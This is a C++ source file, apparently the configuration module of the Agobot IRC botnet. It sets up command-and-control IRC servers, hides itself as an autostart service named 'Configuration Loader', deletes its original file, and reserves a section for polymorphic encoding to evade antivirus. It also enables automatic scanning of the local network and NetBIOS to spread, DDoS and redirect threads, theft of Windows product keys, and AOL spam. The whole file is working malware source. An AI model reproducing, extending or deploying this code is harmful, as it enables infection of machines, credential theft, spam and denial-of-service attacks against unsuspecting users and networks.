#include "main.h"
#include "bot.h"
#include "mainctrl.h"

// Change the "stub" to whatever, just dont remove the '.'
// this is the name of the section used by the polymorph
#define SECTION_NAME ".stub"
char *g_szSectionName=SECTION_NAME;

void CBot::Config()
{	int iCryptKey=10;

	// The root server, this will be the most often used one
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_chanpass,	"si_server_root.chanpass", \
		"",								"Server Info - Channel Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_mainchan,	"si_server_root.mainchan", \
		"#channel",						"Server Info - Main Channel",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_nickprefix,	"si_server_root.nickprefix", \
		"Ago-",							"Server Info - Nickname prefix",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_port,		"si_server_root.port", \
		"6667",							"Server Info - Server Port",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_server,		"si_server_root.server", \
		"irc.somewhere.org",			"Server Info - Server Address",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_servpass,	"si_server_root.servpass", \
		"",								"Server Info - Server Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_usessl,		"si_server_root.use_ssl", \
		"false",						"Server Info - Use SSL ?",			false, false, 0 );
	g_cMainCtrl.m_cIRC.m_vServers.push_back(&m_isServerRoot);

	// Backup server 0
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_chanpass,		"si_server_0.chanpass", \
		"",								"Server Info - Channel Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_mainchan,		"si_server_0.mainchan", \
		"#channel",						"Server Info - Main Channel",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_nickprefix,	"si_server_0.nickprefix", \
		"Ago-",							"Server Info - Nickname prefix",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_port,			"si_server_0.port", \
		"6667",							"Server Info - Server Port",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_server,		"si_server_0.server", \
		"irc2.somewhere.org",			"Server Info - Server Address",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_servpass,		"si_server_0.servpass", \
		"",								"Server Info - Server Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_usessl,		"si_server_0.use_ssl", \
		"false",						"Server Info - Use SSL ?",			false, false, 0 );
	g_cMainCtrl.m_cIRC.m_vServers.push_back(&m_isServer0);

	g_cMainCtrl.m_cCVar.RegisterCvar(&si_nick,			"si_nick",			"",							"Server Info - Nickname",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_version,		"bot_version",		VERSION_AGOBOT,				"Bot - Version",									false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_filename,		"bot_filename",		"filename.exe",				"Bot - Runtime Filename",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_id,			"bot_id",			"a3-100",					"Bot - Current ID",									false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_prefix,		"bot_prefix",		".",						"Bot - Command Prefix",								false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_timeout,		"bot_timeout",		"720000",					"Bot - Timeout for receiving in miliseconds",		false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_seclogin,		"bot_seclogin",		"false",					"Bot - Enable login only by channel messages",		false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_compnick,		"bot_compnick",		"false",					"Bot - Use the computer name as a nickname",		false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_randnick,		"bot_randnick",		"false",					"Bot - Random nicks of Letters and Numbers",	false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_meltserver,	"bot_meltserver",	"false",					"Bot - Melt the original server file",				false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_topiccmd,		"bot_topiccmd",		"true",						"Bot - Execute topic commands",						false,	false,	0			);

	g_cMainCtrl.m_cCVar.RegisterCvar(&as_valname,		"as_valname",		"Configuration Loader",		"Autostart - Value Name",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&as_enabled,		"as_enabled",		"true",						"Autostart - Enabled",								false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&as_service,		"as_service",		"true",						"Autostart - Start as service",						false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&as_service_name,	"as_service_name",	"a3",						"Autostart - Short service name",					false,	false,	0			);

	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_maxthreads,	"scan_maxthreads",	"100",						"Scanner - Maximum Number of threads",				false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_auto,		"scan_auto",		"true",						"Scanner - Autoscan local network",					false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_auto_nb,		"scan_auto_nb",		"true",						"Scanner - Autoscan LAN for NetBIOS",				false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&ddos_maxthreads,	"ddos_maxthreads",	"100",						"DDOS - Maximum Number of threads",					false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&redir_maxthreads,	"redir_maxthreads",	"100",						"Redirect - Maximum Number of threads",				false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&identd_enabled,	"identd_enabled",	"false",					"IdentD - Enable the server",						false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&cdkey_windows,	"cdkey_windows",	"false",					"Return Windows Product Keys on cdkey.get",			false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&csendfile_show,	"csendfile_show",	"false",					"CSendFile - Show connections to the port",			false,	false,	0			);

	g_cMainCtrl.m_cCVar.RegisterCvar(&spam_aol_channel,	"spam_aol_channel",	"#aolspam",					"AOL Spam - Channel name",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&spam_aol_enabled,	"spam_aol_enabled",	"true",						"AOL Spam - Channel name",								false,	false,	0			);

	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_chanpass, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_chanpass.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_mainchan, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_mainchan.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_nickprefix, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_nickprefix.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_port, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_port.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_server, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_server.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_servpass, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_servpass.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_usessl, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_usessl.sValue.CStr());

	// Use MD5 Passwords, for security reasons, has to be uppercase
	g_cMainCtrl.m_cMac.AddUser("User",			"MYMD5HASHWILLBEBIGBADANDLONGHEHE",	"Netmask.Net",	""	);	// "password"
}

void CBot::Autostart()
{	// Uncomment this to do autostart commands

/*
	CMessage mFakeMsg;

	mFakeMsg.bNotice=false; mFakeMsg.bSilent=true;
	mFakeMsg.sChatString.Format(".redirect.http 35233");
	mFakeMsg.sCmd.Assign("redirect.http");
	mFakeMsg.sDest.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
	mFakeMsg.sHost.Assign("AutoStart.Net");
	mFakeMsg.sIdentd.Assign("AutoStart");
	mFakeMsg.sReplyTo.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
	mFakeMsg.sSrc.Assign("AutoStart");
		
	g_cMainCtrl.m_cRedirect.HandleCommand(&mFakeMsg);
*/
}

#ifdef WIN32

#pragma warning(disable:4068)
#pragma data_seg(SECTION_NAME)
// You can try smaller size here. This will make the bot smaller,
// but make it so the encoder still fits in, else no polymorph will
// be done.
__declspec(allocate(SECTION_NAME)) char szBuf[16384];

#endif // WIN32
